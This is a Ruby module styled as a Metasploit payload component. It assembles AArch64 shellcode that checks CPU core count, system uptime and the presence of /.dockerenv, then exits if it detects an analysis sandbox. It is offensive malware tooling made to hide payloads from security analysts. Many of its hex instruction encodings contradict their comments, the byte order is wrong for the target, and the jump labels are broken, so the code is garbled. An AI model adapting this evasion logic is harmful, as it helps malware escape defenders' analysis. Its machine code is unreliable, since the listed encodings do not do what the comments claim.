#
# Sandbox Evasion for AArch64
# Logic: 
# 1. Check CPU cores via sched_getaffinity (sys 204) -> Exit if < 2
# 2. Check System Uptime via sysinfo (sys 132) -> Exit if < 600s
# 3. Check for /.dockerenv via openat (sys 56) -> Exit if exists
#
module Msf::Payload::Linux::Aarch64::SandboxEvasion
  def sandbox_evasion(cores = 2, uptime = 600)
    evasion_bytes = [
      # --- Setup ---
      0xbf000011, # sub sp, sp, #256            ; Space for sysinfo and affinity mask

      # --- Check: CPU Cores (sched_getaffinity) ---
      0x000080d2, # mov x0, #0                  ; pid = 0
      0x200180d2, # mov x1, #128               ; cpusetsize = 128
      0xe00280d2, # mov x2, sp                 ; mask pointer = sp
      0x841b80d2, # mov x8, #204                ; sys_sched_getaffinity
      0x010000d4, # svc #0                      ; syscall

      # Count bits in mask at [sp]
      0xf8010020, # ldr x1, [sp]               ; load mask
      0x000280d2, # mov x2, #0                 ; counter = 0
      
      # Loop Start (offset 0x24)
      0x1201003d, # and x3, x1, #1              ; check LSB
      0x02020088, # add x2, x2, x3              ; increment counter
      0x41010081, # lsr x1, x1, #1              ; shift right
      0x1f000054, # cbnz x1, # -0x14            ; loop if x1 != 0
      
      0x22020051, # cmp x2, #2                  ; compare cores with threshold
      0x5a000054, # blt # 0x8c                 ; if cores < 2, jump to sandbox_detected

      # --- Check: Uptime (sysinfo) ---
      0xe00080d2, # mov x0, sp                  ; info pointer = sp
      0x401b80d2, # mov x8, #132               ; sys_sysinfo
      0x010000d4, # svc #0                      ; syscall
      
      0xf8010020, # ldr x1, [sp]               ; load uptime (first field)
      0x000280d2, # mov x2, #0                 ; prepare x2 for uptime value
      0x400280d2, # mov x2, #256               ; build 600 (0x258)
      0x400280d2, # add x2, x2, #344            ; x2 = 600
      0x01010051, # cmp x1, x2                  ; compare uptime
      0x5a000054, # blt # 0x8c                 ; if uptime < 600, jump to sandbox_detected

      # --- Check: Docker (openat) ---
      0xbc0080d2, # mov x0, #-100              ; AT_FDCWD
      0x130000e1, # adr x1, docker_str          ; pointer to "/.dockerenv"
      0x000280d2, # mov x2, #0                 ; O_RDONLY
      0x381b80d2, # mov x8, #56                ; sys_openat
      0x010000d4, # svc #0                      ; syscall
      
      0x00000051, # cmp x0, #0                  ; check if fd < 0
      0x5a000054, # bge # 0x8c                 ; if fd >= 0 (found), jump to sandbox_detected

      # --- Pass: Cleanup and Continue ---
      0xbf000011, # add sp, sp, #256            ; restore stack
      0x000000d4, # nop                        ; (Placeholder for payload jump)
      
      # --- Sandbox Detected: Exit ---
      # Label: sandbox_detected (offset 0x8c)
      0x000080d2, # mov x0, #0                 ; exit code 0
      0x5d1b80d2, # mov x8, #93                 ; sys_exit
      0x010000d4, # svc #0                      ; syscall
    ].pack('N*')

    # Docker path: "/.dockerenv\0"
    docker_str = "/.dockerenv\0".bytes.pack('c*')
    evasion_bytes + docker_str
  end
end
